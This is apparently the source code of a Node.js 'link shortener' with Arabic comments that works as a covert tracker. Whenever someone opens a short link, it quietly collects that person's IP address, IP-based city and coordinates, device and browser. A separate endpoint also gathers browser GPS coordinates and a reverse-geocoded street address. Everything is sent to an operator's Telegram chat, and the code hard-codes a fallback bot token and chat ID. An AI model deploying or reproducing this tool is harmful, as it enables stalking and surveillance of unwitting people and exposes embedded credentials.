const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
const Reader = require('maxmind').Reader;
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.text({ type: 'text/plain', limit: '10mb' }));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5942654805';
const BASE_URL = process.env.SHORT_DOMAIN || 'https://vvvvv-production-7945.up.railway.app';

const linkStorage = {};
let maxmindReader = null;

// ===== تحميل MaxMind Database =====
async function initMaxMind() {
  try {
    const dbPath = path.join(__dirname, 'geoip', 'GeoLite2-City.mmdb');
    if (fs.existsSync(dbPath)) {
      maxmindReader = await Reader.open(dbPath);
      console.log('✅ MaxMind Database loaded successfully');
    } else {
      console.warn('⚠️ GeoLite2-City.mmdb not found at:', dbPath);
    }
  } catch (err) {
    console.error('❌ Error loading MaxMind database:', err.message);
  }
}

initMaxMind();

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function sendToTelegram(msg, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const response = await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: TELEGRAM_CHAT_ID,
          text: msg,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        },
        { timeout: 10000 }
      );
      console.log('✅ [TG] Sent:', response.data.result.message_id);
      return true;
    } catch (err) {
      console.error(`❌ [TG] Attempt ${i + 1} failed:`, err.response?.data?.description || err.message);
      if (i < retries - 1) await new Promise(r => setTimeout(r, 800));
    }
  }
  return false;
}

// ===== MaxMind Location Detection =====
function getLocationFromMaxMind(ip) {
  if (!maxmindReader) return null;
  
  try {
    const response = maxmindReader.city(ip);
    if (response && response.location) {
      return {
        source: 'MaxMind GeoLite2',
        country: response.country?.names?.ar || response.country?.iso_code || 'Unknown',
        city: response.city?.names?.ar || response.city?.names?.en || 'Unknown',
        latitude: response.location.latitude,
        longitude: response.location.longitude,
        accuracy: `±${response.location.accuracy_radius || 30}km`,
        isp: response.traits?.autonomous_system_organization || 'Unknown',
        timezone: response.location.time_zone || 'Unknown'
      };
    }
  } catch (err) {
    console.log('[MaxMind] Error:', err.message);
  }
  return null;
}

// Reverse Geocoding
async function reverseGeocode(lat, lng) {
  try {
    const res = await axios.get(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
      { timeout: 3000, headers: { 'User-Agent': 'LinkShortener/1.0' } }
    );
    if (res.data && res.data.address) {
      const addr = res.data.address;
      return {
        country: addr.country || 'Unknown',
        city: addr.city || addr.town || addr.village || 'Unknown',
        address: res.data.display_name || 'N/A'
      };
    }
  } catch (e) {
    console.log('[Reverse] Error:', e.message);
  }
  return null;
}

function parseUserAgent(ua) {
  let device = 'Desktop', os = 'Unknown', browser = 'Unknown';
  if (/android/i.test(ua)) { device = 'Android'; os = 'Android'; }
  else if (/iphone|ipad/i.test(ua)) { device = 'iOS'; os = 'iOS'; }
  else if (/windows/i.test(ua)) os = 'Windows';
  else if (/mac os/i.test(ua)) os = 'macOS';
  else if (/linux/i.test(ua)) os = 'Linux';
  if (/chrome/i.test(ua) && !/edg/i.test(ua)) browser = 'Chrome';
  else if (/firefox/i.test(ua)) browser = 'Firefox';
  else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
  else if (/edg/i.test(ua)) browser = 'Edge';
  return { device, os, browser };
}

function safeParseBody(req) {
  if (typeof req.body === 'string') {
    try { return JSON.parse(req.body); } catch (e) { return {}; }
  }
  return req.body || {};
}

// ===== API ROUTES =====

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  let normalizedUrl = url.trim();
  if (!/^https?:\/\//i.test(normalizedUrl)) {
    normalizedUrl = 'https://' + normalizedUrl;
  }

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: normalizedUrl, created: new Date(), clicks: 0 };

  console.log(`[SHORT] Created: ${shortCode} -> ${normalizedUrl}`);

  res.json({
    shortened: `${BASE_URL}/${shortCode}`,
    code: shortCode
  });
});

app.post('/api/log-all', async (req, res) => {
  const body = safeParseBody(req);
  const { code, gps } = body;

  if (!code || !linkStorage[code]) {
    console.log('[API] Code not found:', code);
    return res.status(404).json({ error: 'Not found' });
  }

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
  const userAgent = req.get('user-agent') || 'Unknown';
  const originalUrl = linkStorage[code].original;
  linkStorage[code].clicks++;

  console.log(`[LOG] Processing ${code} | IP: ${ip}`);

  let gpsInfo = null;
  if (gps && gps.latitude && gps.longitude) {
    gpsInfo = {
      latitude: parseFloat(gps.latitude).toFixed(6),
      longitude: parseFloat(gps.longitude).toFixed(6),
      accuracy: `±${(gps.accuracy || 20).toFixed(0)}m`,
      altitude: gps.altitude ? `${Math.round(gps.altitude)}m` : 'N/A',
      heading: (gps.heading !== null && gps.heading !== undefined) ? `${Math.round(gps.heading)}°` : 'N/A'
    };
  }

  const ipInfo = getLocationFromMaxMind(ip);
  let reverseInfo = null;

  if (gpsInfo) {
    reverseInfo = await reverseGeocode(gpsInfo.latitude, gpsInfo.longitude);
  } else if (ipInfo) {
    reverseInfo = await reverseGeocode(ipInfo.latitude, ipInfo.longitude);
  }

  const device = parseUserAgent(userAgent);

  let msg = `🔗 <b>رابط فُتح!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
  msg += `<b>📌 الكود:</b> <code>${code}</code>\n`;
  msg += `<b>🌐 الرابط:</b> ${originalUrl}\n`;
  msg += `<b>🔌 IP:</b> <code>${ip}</code>\n`;
  msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n━━━━━━━━━━━━━━━━━━━\n\n`;

  if (gpsInfo) {
    msg += `<b>✅ [1] 📍 Browser GPS (الأدق)</b>\n📍 <code>${gpsInfo.latitude}, ${gpsInfo.longitude}</code>\n📏 ${gpsInfo.accuracy}\n⛰️ ${gpsInfo.altitude}\n🧭 ${gpsInfo.heading}\n🗺️ <a href="https://maps.google.com/?q=${gpsInfo.latitude},${gpsInfo.longitude}">Maps</a>\n━━━━━━━━━━━━━━━━━━━\n\n`;
  } else {
    msg += `<b>❌ [1] Browser GPS</b> - غير متاح\n━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  if (ipInfo) {
    msg += `<b>✅ [2] 🌐 IP Location (MaxMind)</b>\n🏳️ ${ipInfo.country} | 🏙️ ${ipInfo.city}\n📍 <code>${ipInfo.latitude}, ${ipInfo.longitude}</code>\n📏 ${ipInfo.accuracy}\n🏢 ${ipInfo.isp}\n⏱️ ${ipInfo.timezone}\n🗺️ <a href="https://maps.google.com/?q=${ipInfo.latitude},${ipInfo.longitude}">Maps</a>\n━━━━━━━━━━━━━━━━━━━\n\n`;
  } else {
    msg += `<b>❌ [2] IP Location</b> - Database غير متاح\n━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  if (reverseInfo) {
    msg += `<b>✅ [3] 🗺️ Reverse Geocoding</b>\n🏳️ ${reverseInfo.country}\n🏙️ ${reverseInfo.city}\n🏘️ ${reverseInfo.address}\n━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  msg += `<b>✅ [4] 🖥️ Device Detection</b>\n📱 ${device.device} | ${device.os} | ${device.browser}\n━━━━━━━━━━━━━━━━━━━\n\n`;

  const bestMethod = gpsInfo ? '📍 GPS' : (ipInfo ? '🌐 MaxMind' : 'N/A');
  msg += `<b>🎯 أفضل موقع:</b> ${bestMethod}`;

  await sendToTelegram(msg);
  res.json({ success: true });
});

app.get('/api/test', async (req, res) => {
  const ok = await sendToTelegram('🔗 رسالة اختبار ✅');
  res.json({ telegram: ok ? 'sent' : 'failed' });
});

app.get('/api/stats/:code', (req, res) => {
  const link = linkStorage[req.params.code];
  if (!link) return res.status(404).json({ error: 'Not found' });
  res.json(link);
});

app.use(express.static('.'));

// ===== REDIRECT فوري =====
app.get('/:code', async (req, res) => {
  const { code } = req.params;

  if (!linkStorage[code]) {
    return res.status(404).send('<h1 style="font-family:sans-serif;text-align:center;margin-top:50px">الرابط غير موجود</h1>');
  }

  const originalUrl = linkStorage[code].original;
  linkStorage[code].clicks++;

  // Log في background
  setImmediate(async () => {
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
    const userAgent = req.get('user-agent') || 'Unknown';
    const ipInfo = getLocationFromMaxMind(ip);
    const device = parseUserAgent(userAgent);

    let msg = `🔗 <b>رابط تم فتحه!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
    msg += `<b>📌 الكود:</b> <code>${code}</code>\n`;
    msg += `<b>🌐 الرابط:</b> ${originalUrl}\n`;
    msg += `<b>🔌 IP:</b> <code>${ip}</code>\n`;
    msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n`;

    if (ipInfo) {
      msg += `━━━━━━━━━━━━━━━━━━━\n`;
      msg += `<b>✅ 📍 MaxMind Geolocation</b>\n`;
      msg += `🏳️ ${ipInfo.country} | 🏙️ ${ipInfo.city}\n`;
      msg += `📍 <code>${ipInfo.latitude}, ${ipInfo.longitude}</code>\n`;
      msg += `📏 ${ipInfo.accuracy}\n`;
      msg += `🗺️ <a href="https://maps.google.com/?q=${ipInfo.latitude},${ipInfo.longitude}">Maps</a>\n`;
    }

    msg += `🖥️ ${device.device} | ${device.os} | ${device.browser}`;
    await sendToTelegram(msg);
  });

  res.redirect(301, originalUrl);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});